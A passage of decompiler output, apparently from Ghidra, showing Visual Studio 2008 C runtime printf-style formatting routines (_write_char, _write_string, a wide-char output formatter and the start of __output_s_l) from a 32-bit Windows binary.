              bVar11 = piVar4 != (int *)0x0;
              piVar4 = (int *)-(int)piVar4;
              piVar9 = (int *)-(int)((int)piVar9 + (uint)bVar11);
              local_40c = local_40c | 0x100;
            }
            if ((local_40c & 0x9000) == 0) {
              piVar9 = (int *)0x0;
            }
            lVar12 = CONCAT44(piVar9,piVar4);
            if ((int)local_410 < 0) {
              local_410 = (int *)0x1;
            }
            else {
              local_40c = local_40c & 0xfffffff7;
              if (0x200 < (int)local_410) {
                local_410 = (int *)0x200;
              }
            }
            if (((uint)piVar4 | (uint)piVar9) == 0) {
              local_428 = 0;
            }
            piVar4 = &local_209;
            while( true ) {
              piVar9 = (int *)((int)local_410 + -1);
              if (((int)local_410 < 1) && (lVar12 == 0)) break;
              local_410 = piVar9;
              lVar12 = __aulldvrm((uint)lVar12,(uint)((ulonglong)lVar12 >> 0x20),(uint)local_41c,
                                  (int)local_41c >> 0x1f);
              iVar7 = extraout_ECX + 0x30;
              if (0x39 < iVar7) {
                iVar7 = iVar7 + local_44c;
              }
              *(byte *)piVar4 = (byte)iVar7;
              piVar4 = (int *)((int)piVar4 + -1);
            }
            local_418 = (byte *)((int)&local_209 + -(int)piVar4);
            local_414 = (int *)((int)piVar4 + 1);
            local_410 = piVar9;
            if (((local_40c & 0x200) != 0) &&
               ((local_418 == (byte *)0x0 || (*(byte *)local_414 != 0x30)))) {
              *(byte *)piVar4 = 0x30;
              local_418 = (byte *)((int)&local_209 + -(int)piVar4 + 1);
              local_414 = piVar4;
            }
          }
          else if (local_41c < (byte *)0x54) {
            if (local_41c == (byte *)0x53) {
              if ((local_40c & 0x830) == 0) {
                local_40c = local_40c | 0x20;
              }
              goto LAB_0041de5b;
            }
            if (local_41c != (byte *)0x41) {
              if (local_41c == (byte *)0x43) {
                if ((local_40c & 0x830) == 0) {
                  local_40c = local_40c | 0x20;
                }
LAB_0041df04:
                wVar1 = *(wchar_t *)_ArgList;
                local_468 = (uint)(ushort)wVar1;
                local_420 = (int **)((int)_ArgList + 4);
                local_42c = 1;
                if ((local_40c & 0x20) == 0) {
                  local_408[0]._0_2_ = wVar1;
                }
                else {
                  local_438 = (char)wVar1;
                  local_437 = 0;
                  iVar7 = __mbtowc_l((wchar_t *)local_408,&local_438,
                                     (size_t)(local_45c.locinfo)->locale_name[3],&local_45c);
                  if (iVar7 < 0) {
                    local_440 = 1;
                  }
                }
                local_418 = (byte *)0x1;
                local_414 = local_408;
                goto LAB_0041e3ce;
              }
              if ((local_41c != (byte *)0x45) && (local_41c != (byte *)0x47)) goto LAB_0041e3ce;
            }
            local_41c = local_41c + 0x20;
            local_464 = 1;
LAB_0041ddf2:
            local_40c = local_40c | 0x40;
            local_418 = (byte *)0x200;
            piVar4 = local_408;
            pbVar10 = local_418;
            piVar9 = local_408;
            if ((int)local_410 < 0) {
              local_410 = (int *)0x6;
            }
            else if (local_410 == (int *)0x0) {
              if ((short)local_41c == 0x67) {
                local_410 = (int *)0x1;
              }
            }
            else {
              if (0x200 < (int)local_410) {
                local_410 = (int *)0x200;
              }
              if (0xa3 < (int)local_410) {
                pbVar10 = (byte *)((int)local_410 + 0x15d);
                local_414 = local_408;
                local_448 = (int *)__malloc_crt((size_t)pbVar10);
                piVar4 = local_448;
                piVar9 = local_448;
                if (local_448 == (int *)0x0) {
                  local_410 = (int *)0xa3;
                  piVar4 = local_408;
                  pbVar10 = local_418;
                  piVar9 = local_414;
                }
              }
            }
            local_414 = piVar9;
            local_418 = pbVar10;
            local_470 = *(int **)_ArgList;
            local_420 = (int **)((int)_ArgList + 8);
            local_46c = *(int **)((int)_ArgList + 4);
            plVar16 = &local_45c;
            uVar14 = CONCAT44(local_410,(int)(char)local_41c);
            ppiVar13 = &local_470;
            piVar9 = piVar4;
            pbVar10 = local_418;
            uVar15 = local_464;
            pcVar6 = (code *)__decode_pointer((int)PTR_LAB_00433a0c);
            (*pcVar6)(ppiVar13,piVar9,pbVar10,uVar14,uVar15,plVar16);
            uVar5 = local_40c & 0x80;
            if ((uVar5 != 0) && (local_410 == (int *)0x0)) {
              plVar16 = &local_45c;
              piVar9 = piVar4;
              pcVar6 = (code *)__decode_pointer((int)PTR_LAB_00433a18);
              (*pcVar6)(piVar9,plVar16);
            }
            if (((short)local_41c == 0x67) && (uVar5 == 0)) {
              plVar16 = &local_45c;
              piVar9 = piVar4;
              pcVar6 = (code *)__decode_pointer((int)PTR_LAB_00433a14);
              (*pcVar6)(piVar9,plVar16);
            }
            piVar9 = piVar4;
            piVar3 = local_414;
            if (*(byte *)piVar4 == 0x2d) {
              local_40c = local_40c | 0x100;
              piVar9 = (int *)((int)piVar4 + 1);
              piVar3 = (int *)((int)piVar4 + 1);
            }
LAB_0041dfdd:
            local_414 = piVar3;
            local_418 = (byte *)_strlen((char *)piVar9);
          }
          else {
            if (local_41c == (byte *)0x58) goto LAB_0041e1e3;
            if (local_41c == (byte *)0x5a) {
              piVar4 = *(int **)_ArgList;
              local_420 = (int **)((int)_ArgList + 4);
              piVar9 = (int *)PTR_DAT_00433370;
              piVar3 = (int *)PTR_DAT_00433370;
              if ((piVar4 == (int *)0x0) ||
                 (local_414 = (int *)piVar4[1], piVar3 = (int *)PTR_DAT_00433370,
                 local_414 == (int *)0x0)) goto LAB_0041dfdd;
              local_418 = (byte *)(int)*(short *)piVar4;
              if ((local_40c & 0x800) != 0) {
                iVar7 = (int)local_418 - ((int)local_418 >> 0x1f);
                goto LAB_0041e3c6;
              }
              local_42c = 0;
            }
            else {
              if (local_41c == (byte *)0x61) goto LAB_0041ddf2;
              if (local_41c == (byte *)0x63) goto LAB_0041df04;
            }
          }
LAB_0041e3ce:
          pbVar10 = local_418;
          if (local_440 == 0) {
            if ((local_40c & 0x40) != 0) {
              if ((local_40c & 0x100) == 0) {
                if ((local_40c & 1) == 0) {
                  if ((local_40c & 2) == 0) goto LAB_0041e410;
                  local_43c = 0x20;
                }
                else {
                  local_43c = 0x2b;
                }
              }
              else {
                local_43c = 0x2d;
              }
              local_428 = 1;
            }
LAB_0041e410:
            pbVar8 = (byte *)((int)local_430 + (-local_428 - (int)local_418));
            if ((local_40c & 0xc) == 0) {
              _write_multi_char(L' ',(int)pbVar8);
            }
            _write_string(&local_43c,local_428);
            if (((local_40c & 8) != 0) && ((local_40c & 4) == 0)) {
              _write_multi_char(L'0',(int)pbVar8);
            }
            if ((local_42c == 0) && (0 < (int)pbVar10)) {
              local_41c = pbVar10;
              piVar4 = local_414;
              do {
                local_41c = local_41c + -1;
                iVar7 = __mbtowc_l((wchar_t *)&local_468,(char *)piVar4,
                                   (size_t)(local_45c.locinfo)->locale_name[3],&local_45c);
                if (iVar7 < 1) {
                  local_424 = -1;
                  break;
                }
                _write_char((wchar_t)local_468);
                piVar4 = (int *)((int)piVar4 + iVar7);
              } while (0 < (int)local_41c);
            }
            else {
              _write_string(local_414,(int)pbVar10);
            }
            if ((-1 < local_424) && ((local_40c & 4) != 0)) {
              _write_multi_char(L' ',(int)pbVar8);
            }
          }
        }
        else {
          if ((byte *)0x70 < local_41c) {
            if (local_41c == (byte *)0x73) {
LAB_0041de5b:
              piVar4 = local_410;
              if (local_410 == (int *)0xffffffff) {
                piVar4 = (int *)0x7fffffff;
              }
              local_420 = (int **)((int)_ArgList + 4);
              local_414 = *(int **)_ArgList;
              if ((local_40c & 0x20) == 0) {
                piVar9 = local_414;
                if (local_414 == (int *)0x0) {
                  piVar9 = (int *)PTR_u__null__00433374;
                  local_414 = (int *)PTR_u__null__00433374;
                }
                for (; (piVar4 != (int *)0x0 &&
                       (piVar4 = (int *)((int)piVar4 + -1), *(short *)piVar9 != 0));
                    piVar9 = (int *)((int)piVar9 + 2)) {
                }
                iVar7 = (int)piVar9 - (int)local_414;
LAB_0041e3c6:
                local_420 = (int **)((int)_ArgList + 4);
                local_42c = 1;
                local_418 = (byte *)(iVar7 >> 1);
              }
              else {
                if (local_414 == (int *)0x0) {
                  local_414 = (int *)PTR_DAT_00433370;
                }
                local_418 = (byte *)0x0;
                piVar9 = local_414;
                if (0 < (int)piVar4) {
                  do {
                    if (*(byte *)piVar9 == 0) break;
                    iVar7 = __isleadbyte_l((uint)*(byte *)piVar9,&local_45c);
                    if (iVar7 != 0) {
                      piVar9 = (int *)((int)piVar9 + 1);
                    }
                    piVar9 = (int *)((int)piVar9 + 1);
                    local_418 = local_418 + 1;
                  } while ((int)local_418 < (int)piVar4);
                }
              }
              goto LAB_0041e3ce;
            }
            if (local_41c == (byte *)0x75) goto LAB_0041e086;
            if (local_41c != (byte *)0x78) goto LAB_0041e3ce;
            local_44c = 0x27;
LAB_0041e20f:
            local_41c = (byte *)0x10;
            if ((local_40c & 0x80) != 0) {
              local_43c = 0x30;
              local_43a = (short)local_44c + 0x51;
              local_428 = 2;
            }
            goto LAB_0041e090;
          }
          if (local_41c == (byte *)0x70) {
            local_410 = (int *)0x8;
LAB_0041e1e3:
            local_44c = 7;
            goto LAB_0041e20f;
          }
          if (local_41c < (byte *)0x65) goto LAB_0041e3ce;
          if (local_41c < (byte *)0x68) goto LAB_0041ddf2;
          if (local_41c == (byte *)0x69) goto LAB_0041e07f;
          if (local_41c != (byte *)0x6e) {
            if (local_41c != (byte *)0x6f) goto LAB_0041e3ce;
            local_41c = (byte *)0x8;
            if ((local_40c & 0x80) != 0) {
              local_40c = local_40c | 0x200;
            }
            goto LAB_0041e090;
          }
          piVar4 = *(int **)_ArgList;
          local_420 = (int **)((int)_ArgList + 4);
          iVar7 = __get_printf_count_output();
          if (iVar7 == 0) {
            piVar4 = __errno();
            *piVar4 = 0x16;
            goto LAB_0041dacc;
          }
          if ((local_40c & 0x20) == 0) {
            *piVar4 = local_424;
          }
          else {
            *(short *)piVar4 = (short)local_424;
          }
          local_440 = 1;
        }
        if (local_448 != (int *)0x0) {
          _free(local_448);
          local_448 = (int *)0x0;
        }
      }
      iVar7 = local_460;
      _Format = local_444;
      _ArgList = (va_list)local_420;
      wVar1 = *local_444;
    }
    if (local_450 != '\0') {
      *(uint *)(local_454 + 0x70) = *(uint *)(local_454 + 0x70) & 0xfffffffd;
    }
  }
  iVar7 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar7;
}



// WARNING: Type propagation algorithm not settling

void __cdecl FUN_0041e5e5(int param_1,ushort *param_2,localeinfo_struct *param_3,int **param_4)

{
  ushort uVar1;
  wchar_t wVar2;
  int *piVar3;
  uint uVar4;
  code *pcVar5;
  int iVar6;
  int extraout_ECX;
  byte *pbVar7;
  int **ppiVar8;
  int *piVar9;
  byte *pbVar10;
  ushort *puVar11;
  bool bVar12;
  longlong lVar13;
  undefined8 uVar14;
  undefined4 uVar15;
  localeinfo_struct *plVar16;
  int *local_470;
  int *local_46c;
  uint local_468;
  ushort *local_464;
  undefined4 local_460;
  int *local_45c;
  int local_458;
  int local_454;
  localeinfo_struct local_450;
  int local_448;
  char local_444;
  int local_440;
  char local_43c;
  undefined local_43b;
  uint local_438;
  undefined2 local_434;
  short local_432;
  int *local_430;
  int local_42c;
  int local_428;
  int local_424;
  byte *local_420;
  int **local_41c;
  byte *local_418;
  int *local_414;
  int *local_410;
  uint local_40c;
  int local_408 [127];
  undefined4 local_209;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  local_440 = param_1;
  local_41c = param_4;
  local_458 = 0;
  local_40c = 0;
  local_430 = (int *)0x0;
  local_410 = (int *)0x0;
  local_428 = 0;
  local_454 = 0;
  local_42c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_450,param_3);
  if (param_1 == 0) {
switchD_0041e726_caseD_9:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  else {
    if (param_2 != (ushort *)0x0) {
      local_420 = (byte *)(uint)*param_2;
      local_424 = 0;
      local_418 = (byte *)0x0;
      local_438 = 0;
      local_45c = (int *)0x0;
      if (*param_2 != 0) {
        do {
          puVar11 = param_2 + 1;
          local_464 = puVar11;
          if (local_424 < 0) break;
          wVar2 = (wchar_t)local_420;
          if ((ushort)(wVar2 + L'') < 0x59) {
            uVar4 = local_420[0x42b488] & 0xf;
          }
          else {
            uVar4 = 0;
          }
          local_438 = (uint)((byte)(&DAT_0042b4a8)[local_438 + uVar4 * 9] >> 4);
          ppiVar8 = local_41c;
          switch(local_438) {
          case 0:
switchD_0041e726_caseD_0:
            local_42c = 1;
            _write_char(wVar2);
            ppiVar8 = param_4;
            break;
          case 1:
            local_410 = (int *)0xffffffff;
            local_460 = 0;
            local_454 = 0;
            local_430 = (int *)0x0;
            local_428 = 0;
            local_40c = 0;
            local_42c = 0;
            ppiVar8 = param_4;
            break;
          case 2:
            if (local_420 == (byte *)0x20) {
              local_40c = local_40c | 2;
              ppiVar8 = param_4;
            }
            else if (local_420 == (byte *)0x23) {
              local_40c = local_40c | 0x80;
              ppiVar8 = param_4;
            }
            else if (local_420 == (byte *)0x2b) {
              local_40c = local_40c | 1;
              ppiVar8 = param_4;
            }
            else if (local_420 == (byte *)0x2d) {
              local_40c = local_40c | 4;
              ppiVar8 = param_4;
            }
            else if (local_420 == (byte *)0x30) {
              local_40c = local_40c | 8;
              ppiVar8 = param_4;
            }
            break;
          case 3:
            if (wVar2 == L'*') {
              local_430 = *param_4;
              local_41c = param_4 + 1;
              ppiVar8 = local_41c;
              if ((int)local_430 < 0) {
                local_40c = local_40c | 4;
                local_430 = (int *)-(int)local_430;
              }
            }
            else {
              local_430 = (int *)(local_420 + (int)local_430 * 10 + -0x30);
              ppiVar8 = param_4;
            }
            break;
          case 4:
            local_410 = (int *)0x0;
            ppiVar8 = param_4;
            break;
          case 5:
            if (wVar2 == L'*') {
              local_410 = *param_4;
              local_41c = param_4 + 1;
              ppiVar8 = local_41c;
              if ((int)local_410 < 0) {
                local_410 = (int *)0xffffffff;
              }
            }
            else {
              local_410 = (int *)(local_420 + (int)local_410 * 10 + -0x30);
              ppiVar8 = param_4;
            }
            break;
          case 6:
            if (local_420 == (byte *)0x49) {
              uVar1 = *puVar11;
              if ((uVar1 == 0x36) && (param_2[2] == 0x34)) {
                local_40c = local_40c | 0x8000;
                ppiVar8 = param_4;
                puVar11 = param_2 + 3;
              }
              else if ((uVar1 == 0x33) && (param_2[2] == 0x32)) {
                local_40c = local_40c & 0xffff7fff;
                ppiVar8 = param_4;
                puVar11 = param_2 + 3;
              }
              else {
                ppiVar8 = param_4;
                if (((((uVar1 != 100) && (uVar1 != 0x69)) && (uVar1 != 0x6f)) &&
                    ((uVar1 != 0x75 && (uVar1 != 0x78)))) && (uVar1 != 0x58)) {
                  local_438 = 0;
                  goto switchD_0041e726_caseD_0;
                }
              }
            }
            else if (local_420 == (byte *)0x68) {
              local_40c = local_40c | 0x20;
              ppiVar8 = param_4;
            }
            else if (local_420 == (byte *)0x6c) {
              if (*puVar11 == 0x6c) {
                local_40c = local_40c | 0x1000;
                ppiVar8 = param_4;
                puVar11 = param_2 + 2;
              }
              else {
                local_40c = local_40c | 0x10;
                ppiVar8 = param_4;
              }
            }
            else {
              ppiVar8 = param_4;
              if (local_420 == (byte *)0x77) {
                local_40c = local_40c | 0x800;
              }
            }
            break;
          case 7:
            if (local_420 < (byte *)0x65) {
              if (local_420 == (byte *)0x64) {
LAB_0041ec26:
                local_40c = local_40c | 0x40;
LAB_0041ec2d:
                local_420 = (byte *)0xa;
LAB_0041ec37:
                if (((local_40c & 0x8000) == 0) && ((local_40c & 0x1000) == 0)) {
                  local_41c = param_4 + 1;
                  if ((local_40c & 0x20) == 0) {
                    piVar3 = *param_4;
                    if ((local_40c & 0x40) == 0) {
                      piVar9 = (int *)0x0;
                    }
                    else {
                      piVar9 = (int *)((int)piVar3 >> 0x1f);
                    }
                  }
                  else {
                    if ((local_40c & 0x40) == 0) {
                      piVar3 = (int *)(uint)*(ushort *)param_4;
                    }
                    else {
                      piVar3 = (int *)(int)*(short *)param_4;
                    }
                    piVar9 = (int *)((int)piVar3 >> 0x1f);
                  }
                }
                else {
                  local_41c = param_4 + 2;
                  piVar3 = *param_4;
                  piVar9 = param_4[1];
                }
                if ((((local_40c & 0x40) != 0) && ((int)piVar9 < 1)) && ((int)piVar9 < 0)) {
                  bVar12 = piVar3 != (int *)0x0;
                  piVar3 = (int *)-(int)piVar3;
                  piVar9 = (int *)-(int)((int)piVar9 + (uint)bVar12);
                  local_40c = local_40c | 0x100;
                }
                if ((local_40c & 0x9000) == 0) {
                  piVar9 = (int *)0x0;
                }
                lVar13 = CONCAT44(piVar9,piVar3);
                if ((int)local_410 < 0) {
                  local_410 = (int *)0x1;
                }
                else {
                  local_40c = local_40c & 0xfffffff7;
                  if (0x200 < (int)local_410) {
                    local_410 = (int *)0x200;
                  }
                }
                if (((uint)piVar3 | (uint)piVar9) == 0) {
                  local_428 = 0;
                }
                piVar3 = &local_209;
                while( true ) {
                  piVar9 = (int *)((int)local_410 + -1);
                  if (((int)local_410 < 1) && (lVar13 == 0)) break;
                  local_410 = piVar9;
                  lVar13 = __aulldvrm((uint)lVar13,(uint)((ulonglong)lVar13 >> 0x20),(uint)local_420
                                      ,(int)local_420 >> 0x1f);
                  iVar6 = extraout_ECX + 0x30;
                  if (0x39 < iVar6) {
                    iVar6 = iVar6 + local_458;
                  }
                  *(byte *)piVar3 = (byte)iVar6;
                  piVar3 = (int *)((int)piVar3 + -1);
                }
                local_418 = (byte *)((int)&local_209 + -(int)piVar3);
                local_414 = (int *)((int)piVar3 + 1);
                local_410 = piVar9;
                if (((local_40c & 0x200) != 0) &&
                   ((local_418 == (byte *)0x0 || (*(byte *)local_414 != 0x30)))) {
                  *(byte *)piVar3 = 0x30;
                  local_418 = (byte *)((int)&local_209 + -(int)piVar3 + 1);
                  local_414 = piVar3;
                }
              }
              else if (local_420 < (byte *)0x54) {
                if (local_420 == (byte *)0x53) {
                  if ((local_40c & 0x830) == 0) {
                    local_40c = local_40c | 0x20;
                  }
                  goto LAB_0041ea05;
                }
                if (local_420 != (byte *)0x41) {
                  if (local_420 == (byte *)0x43) {
                    if ((local_40c & 0x830) == 0) {
                      local_40c = local_40c | 0x20;
                    }
LAB_0041eaaf:
                    wVar2 = *(wchar_t *)param_4;
                    local_468 = (uint)(ushort)wVar2;
                    local_41c = param_4 + 1;
                    local_42c = 1;
                    if ((local_40c & 0x20) == 0) {
                      local_408[0]._0_2_ = wVar2;
                    }
                    else {
                      local_43c = (char)wVar2;
                      local_43b = 0;
                      iVar6 = __mbtowc_l((wchar_t *)local_408,&local_43c,
                                         (size_t)(local_450.locinfo)->locale_name[3],&local_450);
                      if (iVar6 < 0) {
                        local_454 = 1;
                      }
                    }
                    local_418 = (byte *)0x1;
                    local_414 = local_408;
                    goto LAB_0041ef75;
                  }
                  if ((local_420 != (byte *)0x45) && (local_420 != (byte *)0x47)) goto LAB_0041ef75;
                }
                local_420 = local_420 + 0x20;
                local_460 = 1;
LAB_0041e99c:
                local_40c = local_40c | 0x40;
                local_418 = (byte *)0x200;
                piVar3 = local_408;
                pbVar10 = local_418;
                piVar9 = local_408;
                if ((int)local_410 < 0) {
                  local_410 = (int *)0x6;
                }
                else if (local_410 == (int *)0x0) {
                  if ((short)local_420 == 0x67) {
                    local_410 = (int *)0x1;
                  }
                }
                else {
                  if (0x200 < (int)local_410) {
                    local_410 = (int *)0x200;
                  }
                  if (0xa3 < (int)local_410) {
                    pbVar10 = (byte *)((int)local_410 + 0x15d);
                    local_414 = local_408;
                    local_45c = (int *)__malloc_crt((size_t)pbVar10);
                    piVar3 = local_45c;
                    piVar9 = local_45c;
                    if (local_45c == (int *)0x0) {
                      local_410 = (int *)0xa3;
                      piVar3 = local_408;
                      pbVar10 = local_418;
                      piVar9 = local_414;
                    }
                  }
                }
                local_414 = piVar9;
                local_418 = pbVar10;
                local_470 = *param_4;
                local_41c = param_4 + 2;
                local_46c = param_4[1];
                plVar16 = &local_450;
                uVar14 = CONCAT44(local_410,(int)(char)local_420);
                ppiVar8 = &local_470;
                piVar9 = piVar3;
                pbVar10 = local_418;
                uVar15 = local_460;
                pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00433a0c);
                (*pcVar5)(ppiVar8,piVar9,pbVar10,uVar14,uVar15,plVar16);
                uVar4 = local_40c & 0x80;
                if ((uVar4 != 0) && (local_410 == (int *)0x0)) {
                  plVar16 = &local_450;
                  piVar9 = piVar3;
                  pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00433a18);
                  (*pcVar5)(piVar9,plVar16);
                }
                if (((short)local_420 == 0x67) && (uVar4 == 0)) {
                  plVar16 = &local_450;
                  piVar9 = piVar3;
                  pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00433a14);
                  (*pcVar5)(piVar9,plVar16);
                }
                if (*(byte *)piVar3 == 0x2d) {
                  local_40c = local_40c | 0x100;
                  piVar3 = (int *)((int)piVar3 + 1);
                  local_414 = piVar3;
                }
LAB_0041eb88:
                local_418 = (byte *)_strlen((char *)piVar3);
              }
              else {
                if (local_420 == (byte *)0x58) goto LAB_0041ed86;
                if (local_420 == (byte *)0x5a) {
                  piVar3 = *param_4;
                  local_41c = param_4 + 1;
                  if ((piVar3 == (int *)0x0) ||
                     (local_414 = (int *)piVar3[1], local_414 == (int *)0x0)) {
                    local_414 = (int *)PTR_DAT_00433370;
                    piVar3 = (int *)PTR_DAT_00433370;
                    goto LAB_0041eb88;
                  }
                  local_418 = (byte *)(int)(short)*(ushort *)piVar3;
                  if ((local_40c & 0x800) != 0) {
                    iVar6 = (int)local_418 - ((int)local_418 >> 0x1f);
                    goto LAB_0041ef6d;
                  }
                  local_42c = 0;
                }
                else {
                  if (local_420 == (byte *)0x61) goto LAB_0041e99c;
                  if (local_420 == (byte *)0x63) goto LAB_0041eaaf;
                }
              }
LAB_0041ef75:
              pbVar10 = local_418;
              if (local_454 == 0) {
                if ((local_40c & 0x40) != 0) {
                  if ((local_40c & 0x100) == 0) {
                    if ((local_40c & 1) == 0) {
                      if ((local_40c & 2) == 0) goto LAB_0041efb7;
                      local_434 = 0x20;
                    }
                    else {
                      local_434 = 0x2b;
                    }
                  }
                  else {
                    local_434 = 0x2d;
                  }
                  local_428 = 1;
                }
LAB_0041efb7:
                pbVar7 = (byte *)((int)local_430 + (-local_428 - (int)local_418));
                if ((local_40c & 0xc) == 0) {
                  _write_multi_char(L' ',(int)pbVar7);
                }
                _write_string(&local_434,local_428);
                if (((local_40c & 8) != 0) && ((local_40c & 4) == 0)) {
                  _write_multi_char(L'0',(int)pbVar7);
                }
                if ((local_42c == 0) && (0 < (int)pbVar10)) {
                  local_420 = pbVar10;
                  piVar3 = local_414;
                  do {
                    local_420 = local_420 + -1;
                    iVar6 = __mbtowc_l((wchar_t *)&local_468,(char *)piVar3,
                                       (size_t)(local_450.locinfo)->locale_name[3],&local_450);
                    if (iVar6 < 1) {
                      local_424 = -1;
                      break;
                    }
                    _write_char((wchar_t)local_468);
                    piVar3 = (int *)((int)piVar3 + iVar6);
                  } while (0 < (int)local_420);
                }
                else {
                  _write_string(local_414,(int)pbVar10);
                }
                if ((-1 < local_424) && ((local_40c & 4) != 0)) {
                  _write_multi_char(L' ',(int)pbVar7);
                }
              }
            }
            else {
              if ((byte *)0x70 < local_420) {
                if (local_420 == (byte *)0x73) {
LAB_0041ea05:
                  piVar3 = local_410;
                  if (local_410 == (int *)0xffffffff) {
                    piVar3 = (int *)0x7fffffff;
                  }
                  local_41c = param_4 + 1;
                  local_414 = *param_4;
                  if ((local_40c & 0x20) == 0) {
                    piVar9 = local_414;
                    if (local_414 == (int *)0x0) {
                      local_414 = (int *)PTR_u__null__00433374;
                      piVar9 = (int *)PTR_u__null__00433374;
                    }
                    for (; (piVar3 != (int *)0x0 &&
                           (piVar3 = (int *)((int)piVar3 + -1), *(ushort *)piVar9 != 0));
                        piVar9 = (int *)((int)piVar9 + 2)) {
                    }
                    iVar6 = (int)piVar9 - (int)local_414;
LAB_0041ef6d:
                    local_41c = param_4 + 1;
                    local_42c = 1;
                    local_418 = (byte *)(iVar6 >> 1);
                  }
                  else {
                    if (local_414 == (int *)0x0) {
                      local_414 = (int *)PTR_DAT_00433370;
                    }
                    local_418 = (byte *)0x0;
                    piVar9 = local_414;
                    if (0 < (int)piVar3) {
                      do {
                        if (*(byte *)piVar9 == 0) break;
                        iVar6 = __isleadbyte_l((uint)*(byte *)piVar9,&local_450);
                        if (iVar6 != 0) {
                          piVar9 = (int *)((int)piVar9 + 1);
                        }
                        piVar9 = (int *)((int)piVar9 + 1);
                        local_418 = local_418 + 1;
                      } while ((int)local_418 < (int)piVar3);
                    }
                  }
                  goto LAB_0041ef75;
                }
                if (local_420 == (byte *)0x75) goto LAB_0041ec2d;
                if (local_420 != (byte *)0x78) goto LAB_0041ef75;
                local_458 = 0x27;
LAB_0041edb6:
                local_420 = (byte *)0x10;
                if ((local_40c & 0x80) != 0) {
                  local_434 = 0x30;
                  local_432 = (short)local_458 + 0x51;
                  local_428 = 2;
                }
                goto LAB_0041ec37;
              }
              if (local_420 == (byte *)0x70) {
                local_410 = (int *)0x8;
LAB_0041ed86:
                local_458 = 7;
                goto LAB_0041edb6;
              }
              if (local_420 < (byte *)0x65) goto LAB_0041ef75;
              if (local_420 < (byte *)0x68) goto LAB_0041e99c;
              if (local_420 == (byte *)0x69) goto LAB_0041ec26;
              if (local_420 != (byte *)0x6e) {
                if (local_420 != (byte *)0x6f) goto LAB_0041ef75;
                local_420 = (byte *)0x8;
                if ((local_40c & 0x80) != 0) {
                  local_40c = local_40c | 0x200;
                }
                goto LAB_0041ec37;
              }
              piVar3 = *param_4;
              local_41c = param_4 + 1;
              iVar6 = __get_printf_count_output();
              if (iVar6 == 0) goto switchD_0041e726_caseD_9;
              if ((local_40c & 0x20) == 0) {
                *piVar3 = local_424;
              }
              else {
                *(ushort *)piVar3 = (ushort)local_424;
              }
              local_454 = 1;
            }
            ppiVar8 = local_41c;
            puVar11 = local_464;
            if (local_45c != (int *)0x0) {
              _free(local_45c);
              local_45c = (int *)0x0;
              ppiVar8 = local_41c;
              puVar11 = local_464;
            }
            break;
          default:
            goto switchD_0041e726_caseD_9;
          case 0xbad1abe1:
            break;
          }
          local_420 = (byte *)(uint)*puVar11;
          param_4 = ppiVar8;
          param_2 = puVar11;
        } while (*puVar11 != 0);
        if ((local_438 != 0) && (local_438 != 7)) goto LAB_0041e68b;
      }
      if (local_444 != '\0') {
        *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041f154;
    }
LAB_0041e68b:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_444 != '\0') {
    *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
  }
LAB_0041f154:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2008 Release

void __fastcall _write_char(FILE *param_1)

{
  int *piVar1;
  byte in_AL;
  uint uVar2;
  int *unaff_ESI;
  
  if (((*(byte *)&param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
    piVar1 = &param_1->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      uVar2 = __flsbuf((int)(char)in_AL,param_1);
    }
    else {
      *param_1->_ptr = in_AL;
      param_1->_ptr = param_1->_ptr + 1;
      uVar2 = (uint)in_AL;
    }
    if (uVar2 == 0xffffffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_multi_char(undefined4 param_1,int param_2,FILE *param_3)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    _write_char(param_3);
  } while (*in_EAX != -1);
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_string(int param_1)

{
  int *in_EAX;
  int *piVar1;
  FILE *unaff_EDI;
  
  if (((*(byte *)&unaff_EDI->_flag & 0x40) == 0) || (unaff_EDI->_base != (char *)0x0)) {
    while (0 < param_1) {
      param_1 = param_1 + -1;
      _write_char(unaff_EDI);
      if (*in_EAX == -1) {
        piVar1 = __errno();
        if (*piVar1 != 0x2a) {
          return;
        }
        _write_char(unaff_EDI);
      }
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __output_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __output_s_l(FILE *_File,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  byte bVar1;
  wchar_t _WCh;
  FILE *pFVar2;
  int *piVar3;
  uint uVar4;
  code *pcVar5;
  errno_t eVar6;
  int iVar7;
  undefined *puVar8;
  int extraout_ECX;
  byte *pbVar9;
  char *pcVar10;
  int *piVar11;
  bool bVar12;
  undefined8 uVar13;
  int **ppiVar14;
  int *piVar15;
  int *piVar16;
  undefined4 uVar17;
  localeinfo_struct *plVar18;
  int *local_27c;
  int *local_278;
  int local_274;
  undefined4 local_270;
  int *local_268;
  FILE *local_264;
  int local_260;
  int local_25c;
  int *local_258;
  localeinfo_struct local_254;
  int local_24c;
  char local_248;
  uint local_244;
  byte *local_240;
  int local_23c;
  int *local_238;
  int local_234;
  undefined local_230;
  char local_22f;
  int local_22c;
  int **local_228;
  int *local_224;
  int *local_220;
  int *local_21c;
  byte local_215;
  uint local_214;
  int local_210 [127];
  undefined local_11 [9];
  uint local_8;
  
